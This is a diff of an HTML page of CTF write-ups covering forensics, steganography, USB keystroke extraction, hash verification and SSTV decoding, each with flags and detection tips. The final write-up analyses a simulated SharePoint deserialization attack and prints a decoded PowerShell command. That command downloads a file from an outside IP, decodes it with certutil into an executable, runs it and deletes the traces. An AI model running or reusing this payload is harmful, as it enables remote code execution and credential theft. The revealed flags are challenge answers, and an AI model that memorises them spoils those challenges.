-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔍 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="easyforensics_phase1_title">Volatility Analysis</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="easyforensics_phase1_desc">
-                        Using Volatility to analyze the raw memory dump. Scanned for files and processes but found
-                        nothing unusual initially.
-                    </p>
-                    <img src="assets/img/ctf_dl/easy-forensics/38235985-43ab-44e6-a446-c58edc2b7528.png"
-                        alt="Volatility Scan" class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🗝️ <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="easyforensics_phase2_title">Registry Hunting</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="easyforensics_phase2_desc">
-                        Suspecting persistence mechanisms, I checked the Windows Registry "Run" keys. Found a suspicious
-                        base64 string.
-                    </p>
-                    <img src="assets/img/ctf_dl/easy-forensics/00799e47-5d28-4cac-b45d-8a208a9a45f8.png"
-                        alt="Registry Key" class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_forensics_summary">Memory forensics challenge involving analysis of a Windows
+                    memory dump to identify fileless malware persistence mechanism. The attacker used registry Run keys
+                    to maintain persistence with Base64-encoded payload.</p>
             </div>
-            <div class="space-y-6">
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">⚠️ <span data-i18n="wu_tools">Tools
-                            Used</span></h3>
-                    <div class="flex flex-wrap gap-2">
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Volatility</span>
-                    </div>
-                </div>
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code class="font-mono text-emerald-accent text-sm break-all">ASCIS{Gh4st1n_Th3_R2M}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1547.001</code></td>
+                        <td>Registry Run Keys</td>
+                        <td>Persistence via startup registry</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>Base64 encoded payload</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1059.001</code></td>
+                        <td>PowerShell</td>
+                        <td>Fileless execution</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_forensics_intro">The problem starts with the Memory.rar file, after extracting it we
+                get 2 files Memory.raw and Gift.raw.</p>
+            <img src="assets/img/ctf_dl/easy-forensics/4ba819f4-8b1e-4b7d-9ebb-8b8150f22bd2.png"
+                alt="Challenge description">
+            <img src="assets/img/ctf_dl/easy-forensics/1170f784-f61f-4d0c-a5a0-159eb265e297.png" alt="Extracted files">
+
+            <p data-i18n="writeup_forensics_volatility">Because this is a raw memory file, I used Volatility to analyze
+                it.</p>
+            <img src="assets/img/ctf_dl/easy-forensics/38235985-43ab-44e6-a446-c58edc2b7528.png"
+                alt="Volatility analysis">
+            <img src="assets/img/ctf_dl/easy-forensics/8ec04db8-1e5a-4ab0-88e1-d5b94b3d7d18.png"
+                alt="File profile info">
+
+            <p data-i18n="writeup_forensics_registry">Based on the given data, I researched that persistence technique
+                will use some ways for malware to turn on and start automatically when the system restarts. Malware
+                often adds to the "Run" folder of the Windows Registry.</p>
+            <img src="assets/img/ctf_dl/easy-forensics/d6530efb-e40e-42e3-9828-e79255d95355.png"
+                alt="Registry analysis">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_forensics_base64">And luckily I found a base64 encrypted code:</p>
+            <blockquote>UGFzc3dvcmQgaXMge0ZpbGVsZXNzLU1hbHdhcmUtUGVyc2lzdGVuY2V9</blockquote>
+            <img src="assets/img/ctf_dl/easy-forensics/00799e47-5d28-4cac-b45d-8a208a9a45f8.png"
+                alt="Base64 code found">
+
+            <p data-i18n="writeup_forensics_decrypt">Decrypted it and I got the password of the Gift.rar file. Extract
+                Gift.rar file, I got the flag in Gift.txt file:</p>
+            <img src="assets/img/ctf_dl/easy-forensics/11c658df-eeab-4faa-ac65-1b82a365de9d.png"
+                alt="Decrypted password">
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Monitor Registry Run keys for suspicious entries</li>
+                    <li>Alert on Base64-encoded strings in registry values</li>
+                    <li>Use Volatility printkey plugin for memory analysis</li>
+                    <li>Detect fileless malware through PowerShell logging</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> ASCIS{Gh4st1n_Th3_R2M}</blockquote>
         </div>
     </template>
 
     <template id="writeup-known-unknowns">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="knownunknowns_desc">
-                        Provided with a .wav audio file.
-                    </p>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🎵 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="knownunknowns_phase1_title">Spectrogram Analysis</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="knownunknowns_phase1_desc">
-                        Opened the file in Sonic Visualiser. Added a Spectrogram layer to visualize the audio
-                        frequencies.
-                    </p>
-                    <img src="assets/img/ctf_dl/df-200---known-unknowns/4edb527a-cd95-4c95-a88d-7ed591d9422e.png"
-                        alt="Spectrogram" class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_unknowns_summary">Audio steganography challenge involving spectrogram analysis of
+                    a WAV file to reveal hidden text embedded in the frequency domain.</p>
             </div>
-            <div class="space-y-6">
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code class="font-mono text-emerald-accent text-sm break-all">UWSP{D0_y0U_Kn0W_th3_UnKn0Wn}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1001.002</code></td>
+                        <td>Data Obfuscation: Steganography</td>
+                        <td>Data hidden in audio frequency</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>Visual encoding in spectrograms</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_unknowns_intro">The question gives a .wav audio file.</p>
+            <img src="assets/img/ctf_dl/df-200---known-unknowns/ca6fda4b-cb17-424e-9031-2bff491aaa59.png"
+                alt="Challenge description">
+            <img src="assets/img/ctf_dl/df-200---known-unknowns/a87b4a11-1401-427d-a7c6-5e1c695e8c0a.png"
+                alt="Audio file info">
+
+            <p data-i18n="writeup_unknowns_analysis">At this point I immediately thought of using tools to visualize the
+                audio, such as Sonic Visualiser.</p>
+            <img src="assets/img/ctf_dl/df-200---known-unknowns/5fb61e8e-e7be-461a-b008-141b6852d40d.png"
+                alt="Sonic Visualiser">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_unknowns_spectrogram">I tried to add a spectrogram layer to see if there was hidden
+                text and I found a flag...</p>
+            <img src="assets/img/ctf_dl/df-200---known-unknowns/4edb527a-cd95-4c95-a88d-7ed591d9422e.png"
+                alt="Flag in spectrogram">
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Scan audio files for anomalous frequency patterns</li>
+                    <li>Monitor for Sonic Visualiser and Audacity usage</li>
+                    <li>Analyze spectrograms of suspicious audio files</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> poctf{uwsp_kn0wn_unkn0wns}</blockquote>
         </div>
     </template>
 
     <template id="writeup-tet-riffic">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="tetriffic_desc">
-                        A Tetris game (tetris.py) and a PCAP file. The game blocks are predetermined, and the PCAP
-                        contains USB traffic.
-                    </p>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">⌨️ <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="tetriffic_phase1_title">USB HID Extraction</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="tetriffic_phase1_desc">
-                        Extracted USB keystrokes from the PCAP using tshark and a custom parser script. These keystrokes
-                        correspond to the moves made in the game.
-                    </p>
-                    <img src="assets/img/ctf_dl/tet-riffic!/0d93de48-eeb2-4980-a496-f16e0721b902.png" alt="Keystrokes"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🧩 <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="tetriffic_phase2_title">Game Replay</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="tetriffic_phase2_desc">
-                        Modified `tetris.py` to replay the extracted keystrokes. The game board formed a QR code
-                        pattern.
-                    </p>
-                    <img src="assets/img/ctf_dl/tet-riffic!/4974948d-5241-4058-a38a-1ed2992a4f18.png" alt="QR Code"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📱 <span data-i18n="wu_phase3">Phase
-                            3</span>: <span data-i18n="tetriffic_phase3_title">QR Reconstruction</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="tetriffic_phase3_desc">
-                        The QR code was incomplete. Reconstructed it in Excel and used QRazyBox to decode it.
-                    </p>
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_tetriffic_summary">USB HID forensics challenge involving keystroke extraction from
+                    a PCAP file. The keystrokes controlled a Tetris game that rendered a QR code containing the flag
+                    when played correctly.</p>
             </div>
-            <div class="space-y-6">
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code
-                        class="font-mono text-emerald-accent text-sm break-all">nite{mayb3_th3_r3al_tetr15_wa5_qrc0d3s_we_mad3_a10ng_th3_way}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1056.001</code></td>
+                        <td>Keylogging</td>
+                        <td>USB HID keystroke capture</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1001.002</code></td>
+                        <td>Steganography</td>
+                        <td>QR code hidden in game</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>Data encoded in Tetris patterns</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_tetriffic_intro">The challenge is provided with two files: tetris.pcapng and
+                tetris.py. When running the tetris.py file, it becomes clear that it is a Tetris game.</p>
+            <img src="assets/img/ctf_dl/tet-riffic!/1ce6df2c-21fd-4a25-96f8-829e0ae57bf4.png" alt="Challenge files">
+            <img src="assets/img/ctf_dl/tet-riffic!/09adc6b0-43da-45b9-a699-4b1f1f1da442.png" alt="Tetris game">
+
+            <p data-i18n="writeup_tetriffic_blocks">I noticed that the blocks are not being generated randomly, but are
+                predetermined and appear in a fixed sequence.</p>
+
+            <p data-i18n="writeup_tetriffic_pcap">Looking into the tetris.pcapng file, I observed that the URB requests
+                captured data from the user's keyboard. These keypresses correspond to the keys used in the Tetris game.
+            </p>
+            <img src="assets/img/ctf_dl/tet-riffic!/f31f6ac4-debe-48d2-b5d7-d8bba3b91d07.png" alt="USB capture">
+            <img src="assets/img/ctf_dl/tet-riffic!/98e0dcc6-580f-4a6d-8f93-acf9bb4238a2.png" alt="Keyboard data">
+
+            <p data-i18n="writeup_tetriffic_extract">I used tshark to extract usbhid.data from the pcapng file and found
+                a tool to extract and print keystrokes in plaintext.</p>
+            <img src="assets/img/ctf_dl/tet-riffic!/e582ad7d-00bb-46f6-9289-ac252774290d.png" alt="Tshark extraction">
+            <img src="assets/img/ctf_dl/tet-riffic!/a70fcee8-4160-4b12-9c96-9b58740f49d7.png" alt="Keystroke output">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_tetriffic_qr">At this point, I noticed the game generating a pattern resembling a QR
+                code. After adjusting, I obtained a partial QR code.</p>
+            <img src="assets/img/ctf_dl/tet-riffic!/9a847945-1ff4-41a6-b64a-2452950626b6.png" alt="QR pattern forming">
+            <img src="assets/img/ctf_dl/tet-riffic!/4974948d-5241-4058-a38a-1ed2992a4f18.png" alt="Partial QR code">
+
+            <p data-i18n="writeup_tetriffic_reconstruct">I manually recreated this QR code in Excel with pixel accuracy
+                and used QRazyBox tool to read the incomplete QR code.</p>
+            <img src="assets/img/ctf_dl/tet-riffic!/4aef63a3-3fe7-4253-820e-7c08d348fd1a.png"
+                alt="Excel QR reconstruction">
+            <img src="assets/img/ctf_dl/tet-riffic!/8063e5de-7d63-40cf-bb78-b32590936393.png" alt="QRazyBox decoding">
+            <img src="assets/img/ctf_dl/tet-riffic!/7dd77167-1750-4880-b65e-2f9317c0f62d.png" alt="Flag found">
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Monitor for USB HID traffic capture tools (tshark, Wireshark)</li>
+                    <li>Detect keystroke extraction patterns from PCAP files</li>
+                    <li>Alert on QR code scanning/generation tools execution</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> nite{mayb3_th3_r3al_tetr15_wa5_qrc0d3s_we_mad3_a10ng_th3_way}
+            </blockquote>
         </div>
     </template>
 
     <template id="writeup-st3g0">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="st3g0_desc">
-                        A simple PNG steganography challenge.
-                    </p>
-                    <img src="assets/img/ctf_dl/st3g0/ab0c6d97-8cd5-4cd8-b17a-e6e673f12e24.png" alt="Challenge Image"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🕵️ <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="st3g0_phase1_title">Solution</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="st3g0_phase1_desc">
-                        Used `zsteg` to analyze the PNG file. The flag was hidden in the LSB data.
-                    </p>
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_st3g0_summary">LSB steganography challenge involving hidden data extraction from a
+                    PNG image using bit-level analysis.</p>
             </div>
-            <div class="space-y-6">
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code
-                        class="font-mono text-emerald-accent text-sm break-all">picoCTF{7h3r3_15_n0_5p00n_a1062667}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1001.002</code></td>
+                        <td>Steganography</td>
+                        <td>LSB encoding in images</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>Hidden data in image bits</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_st3g0_intro">After downloading and realizing it was a PNG file, I tried checking it
+                with zsteg to see if anything was hidden.</p>
+            <img src="assets/img/ctf_dl/st3g0/ab0c6d97-8cd5-4cd8-b17a-e6e673f12e24.png" alt="Zsteg analysis">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_st3g0_result">And luckily, I immediately found the flag using zsteg.</p>
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Scan images for LSB anomalies using automated tools</li>
+                    <li>Monitor for steganography detection tools (zsteg, stegsolve)</li>
+                    <li>Flag images with unusual bit patterns</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> picoCTF{7h3r3_15_n0_5p00n_a1062667}</blockquote>
         </div>
     </template>
 
     <template id="writeup-verify">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="verify_desc">
-                        Given 1000+ files and a SHA-256 hash. Find the file that matches the hash.
-                    </p>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📜 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="verify_phase1_title">Scripting</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="verify_phase1_desc">
-                        Wrote a script to calculate SHA-256 sums of all files and grep for the target hash. Found file
-                        `8eee7195`.
-                    </p>
-                    <img src="assets/img/ctf_dl/verify/42ab549a-cf90-4552-9912-44f34f1541dc.png" alt="Script Result"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔓 <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="verify_phase2_title">Decryption</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="verify_phase2_desc">
-                        Used the provided `decrypt.sh` with the target file to reveal the flag.
-                    </p>
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_verify_summary">File integrity verification challenge using SHA-256 checksums to
+                    identify the correct file among thousands of decoys.</p>
             </div>
-            <div class="space-y-6">
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code
-                        class="font-mono text-emerald-accent text-sm break-all">picoCTF{trust_but_verify_8eee7195}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>Flag hidden among decoys</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1140</code></td>
+                        <td>Deobfuscate/Decode</td>
+                        <td>Hash-based file identification</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_verify_intro">We are given a series of files in a directory and provided with a
+                SHA-256 hash value. The task is to calculate the checksums of the files and compare them.</p>
+            <img src="assets/img/ctf_dl/verify/aa504d9c-cf18-4a52-9369-a9148f484400.png" alt="Challenge description">
+
+            <p data-i18n="writeup_verify_code">I wrote a piece of code to iterate through all the files in the
+                directory, using checksums to compare them with the provided hash value.</p>
+            <img src="assets/img/ctf_dl/verify/42ab549a-cf90-4552-9912-44f34f1541dc.png" alt="Hash comparison script">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_verify_found">I found the file <code>8eee7195</code> whose hash matches the hash
+                provided in the challenge. Using the provided <code>decrypt.sh</code> file, I was able to find the flag.
+            </p>
+            <img src="assets/img/ctf_dl/verify/2a1b59f6-6999-4d3d-abb7-9ebcf2f86ca7.png" alt="File found">
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Use file integrity monitoring (FIM) for critical systems</li>
+                    <li>Implement hash verification for downloaded files</li>
+                    <li>Monitor for mass file hashing operations</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> picoCTF{trust_but_verify_8eee7195}</blockquote>
         </div>
     </template>
 
     <template id="writeup-m00nwalk">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="m00nwalk_desc">
-                        Received audio signals from the "moon". Identified as SSTV (Slow Scan Television).
-                    </p>
-                    <img src="assets/img/ctf_dl/m00nwalk/ca783e8b-2339-4fb8-850a-7a61c6e3ff4e.png" alt="Signal"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📡 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="m00nwalk_phase1_title">Decoding</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="m00nwalk_phase1_desc">
-                        Used an SSTV decoder tool to convert the audio into an image, revealing the flag.
-                    </p>
-                    <img src="assets/img/ctf_dl/m00nwalk/be9002b5-5d73-4b85-9816-27706e1803b8.png" alt="Decoded Image"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_moonwalk_summary">SSTV (Slow Scan Television) steganography challenge involving
+                    decoding an image transmitted via audio frequencies, similar to NASA's Apollo-era moon
+                    transmissions.</p>
             </div>
-            <div class="space-y-6">
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code class="font-mono text-emerald-accent text-sm break-all">CTF{beep_boop_im_in_space}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1001.002</code></td>
+                        <td>Steganography</td>
+                        <td>Data encoded in audio</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>SSTV signal encoding</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_moonwalk_intro">The challenge provides a .wav audio file. I immediately thought of
+                using tools to visualize the audio, such as Sonic Visualiser.</p>
+            <img src="assets/img/ctf_dl/m00nwalk/ca783e8b-2339-4fb8-850a-7a61c6e3ff4e.png" alt="Challenge description">
+            <img src="assets/img/ctf_dl/m00nwalk/05558c35-a7f7-46ca-9f78-6f80ad3f4cfa.png" alt="Audio file">
+            <img src="assets/img/ctf_dl/m00nwalk/e2b54504-150b-4552-ba0a-7164b5d20be1.png" alt="Waveform">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_moonwalk_sstv">I did some research and found out about SSTV (Slow Scan Television), a
+                method used mainly by amateur radio operators to transmit static pictures. It was also used to transmit
+                images from the moon.</p>
+            <img src="assets/img/ctf_dl/m00nwalk/be9002b5-5d73-4b85-9816-27706e1803b8.png" alt="SSTV decoded image">
+
+            <p data-i18n="writeup_moonwalk_result">After downloading the tool and using it to decrypt the audio file, I
+                obtained the flag.</p>
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Monitor for SSTV decoder software execution</li>
+                    <li>Scan audio files for SSTV signal patterns</li>
+                    <li>Alert on unusual audio frequency modulation</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> picoCTF{beep_boop_im_in_space}</blockquote>
         </div>
     </template>
 
-    <!-- Prism.js -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <template id="writeup-gimme-your-point">
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_gimme_summary">A sophisticated attack simulation exploiting
+                    <strong>CVE-2025-49704</strong>, a SharePoint deserialization vulnerability in the ToolShell
+                    component. This challenge recreates a real-world case study where attackers embed deserialization
+                    payloads into the <code>MSOTlPn_DWP</code> parameter of POST requests to achieve RCE and exfiltrate
+                    Chrome browser credentials.</p>
+            </div>
 
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1190</code></td>
+                        <td>Exploit Public-Facing Application</td>
+                        <td>SharePoint CVE-2025-49704</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1059.001</code></td>
+                        <td>PowerShell</td>
+                        <td>Payload download & execution</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1555.003</code></td>
+                        <td>Credentials from Web Browsers</td>
+                        <td>Chrome Login Data theft</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1560.001</code></td>
+                        <td>Archive Collected Data</td>
+                        <td>Password-protected ZIP</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1041</code></td>
+                        <td>Exfiltration Over C2 Channel</td>
+                        <td>HTTP POST upload</td>
+                    </tr>
+                </table>
+            </div>
+
+            <h4>🔍 Phase 1: Initial PCAP Analysis</h4>
+            <p data-i18n="writeup_gimme_phase1">Opening the challenge PCAP file in Wireshark, I observed HTTP GET
+                requests returning a <code>start.aspx</code> file - indicating a web-based attack. I used
+                <strong>Wireshark's Export Objects</strong> feature to extract all HTTP files.</p>
+            <img src="assets/img/vcspassport2025/image1.png" alt="HTTP object export">
+
+            <p data-i18n="writeup_gimme_phase1b">Using <code>strings</code> and <code>file</code> commands to analyze
+                extracted files, I discovered a suspicious encoded <code>CompressedDataTable</code> value in
+                <code>ToolPane.aspx</code>.</p>
+
+            <h4>🔍 Phase 2: CVE Research - ToolShell Vulnerability</h4>
+            <p data-i18n="writeup_gimme_phase2">Searching for "CompressedDataTable SharePoint" led me to VCS's security
+                article about <strong>ToolShell</strong> - a critical SharePoint vulnerability chain being actively
+                exploited in the wild.</p>
+            <blockquote><strong>Key Discovery:</strong> This challenge simulates CVE-2025-49704, where attackers embed
+                deserialization payloads into the <code>MSOTlPn_DWP</code> parameter of POST requests.</blockquote>
+
+            <h4>🔍 Phase 3: Payload Decoding</h4>
+            <p data-i18n="writeup_gimme_phase3">I extracted the <code>CompressedDataTable</code> value and performed
+                Base64 decode → GZIP decompress, revealing a shell payload with a PowerShell command:</p>
+            <img src="assets/img/vcspassport2025/image13.png" alt="PowerShell payload">
+
+            <pre><code class="language-powershell">powershell -c "Invoke-WebRequest -Uri http://30.243.67.128:1234/raw_package -OutFile C:\Windows\Temp\raw_package;
+Add-Content -Path C:\Windows\Temp\raw_package -Value [base64_data];
+certutil -decode C:\Windows\Temp\raw_package C:\Windows\Temp\d1;
+certutil -decode C:\Windows\Temp\d1 C:\Windows\Temp\health_check.exe;
+del C:\Windows\Temp\raw_package; del C:\Windows\Temp\d1;
+C:\Windows\Temp\health_check.exe; sleep 10;
+del C:\Windows\Temp\health_check.exe"</code></pre>
+
